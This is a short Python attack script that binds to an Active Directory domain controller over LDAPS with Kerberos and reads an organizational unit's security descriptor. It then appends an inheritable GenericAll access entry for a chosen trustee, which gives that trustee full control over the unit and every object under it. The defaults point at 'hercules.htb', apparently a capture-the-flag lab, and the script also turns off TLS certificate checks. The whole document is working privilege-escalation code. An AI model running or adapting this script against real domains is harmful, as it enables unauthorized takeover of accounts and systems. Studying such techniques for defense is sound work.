#!/usr/bin/env python3
"""Append an inheritable GenericAll ACE to an OU's DACL, so it propagates to descendants.

usage: ou_acl.py <ou-dn> <trustee-sid-or-sam>
"""
import sys, ssl, uuid
from ldap3 import Server, Connection, ALL, SASL, KERBEROS, Tls
from ldap3.protocol.microsoft import security_descriptor_control
from impacket.ldap import ldaptypes

OU = sys.argv[1] if len(sys.argv) > 1 else "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb"
TRUSTEE = sys.argv[2] if len(sys.argv) > 2 else "Forest Management"

# GenericAll | this-object is replaced by inherit-only on children
MASK = 0x000F01FF

tls = Tls(validate=ssl.CERT_NONE)
s = Server("dc.hercules.htb", port=636, use_ssl=True, tls=tls, get_info=ALL)
c = Connection(s, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
print("bound as:", c.extend.standard.who_am_i())

# resolve trustee -> SID
c.search("DC=hercules,DC=htb", f"(sAMAccountName={TRUSTEE})", attributes=["objectSid"])
if not c.entries:
    c.search("DC=hercules,DC=htb", f"(cn={TRUSTEE})", attributes=["objectSid"])
sid_bytes = c.entries[0].objectSid.raw_values[0]
sid = ldaptypes.LDAP_SID()
sid.fromCanonical(str(c.entries[0].objectSid))
print("trustee:", c.entries[0].entry_dn, str(c.entries[0].objectSid))

# read OU DACL
c.search(OU, "(objectClass=*)", attributes=["nTSecurityDescriptor"], search_scope="BASE",
         controls=security_descriptor_control(sdflags=0x04))
raw = c.entries[0].entry_raw_attributes["nTSecurityDescriptor"][0]
sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)

ace = ldaptypes.ACE()
ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
ace["AceFlags"] = 0x03  # OBJECT_INHERIT_ACE | CONTAINER_INHERIT_ACE
aca = ldaptypes.ACCESS_ALLOWED_ACE()
aca["Mask"] = ldaptypes.ACCESS_MASK()
aca["Mask"]["Mask"] = MASK
aca["Sid"] = sid
ace["Ace"] = aca
sd["Dacl"]["Data"].append(ace)
print("dacl entries now:", len(sd["Dacl"]["Data"]))

ok = c.modify(OU, {"nTSecurityDescriptor": [("MODIFY_REPLACE", [sd.getData()])]},
              controls=security_descriptor_control(sdflags=0x04))
print("modify:", ok, c.result.get("description"), (c.result.get("message") or "").strip())
c.unbind()
